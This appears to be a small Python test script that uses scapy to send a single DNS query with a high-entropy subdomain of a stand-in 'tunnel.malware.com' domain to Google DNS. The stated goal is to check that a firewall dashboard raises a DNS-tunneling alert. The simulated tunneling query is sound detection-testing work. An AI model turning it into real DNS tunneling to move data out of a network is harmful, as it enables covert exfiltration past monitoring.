#test_dns.py

#imports
import socket
from scapy.all import IP, UDP, DNS, DNSQR, send

# TARGET CONFIGURATION
TARGET_IP = "8.8.8.8" # Sending to Google DNS (Firewall should intercept)
# A string with high randomness (Entropy > 3.5)
TUNNEL_DOMAIN = "x8z9q2m1p00l3x4aa9.tunnel.malware.com" 

# ATTACK START
print(f"--- 🚇 TESTING DNS TUNNELING DETECTION ---")
print(f"Query: {TUNNEL_DOMAIN}")

# CRAFT AND SEND DNS QUERY PACKET
pkt = IP(dst=TARGET_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=TUNNEL_DOMAIN))
send(pkt)

# CONFIRMATION
print("[✔] Packet Sent. Check Dashboard for 'High Entropy' alert.")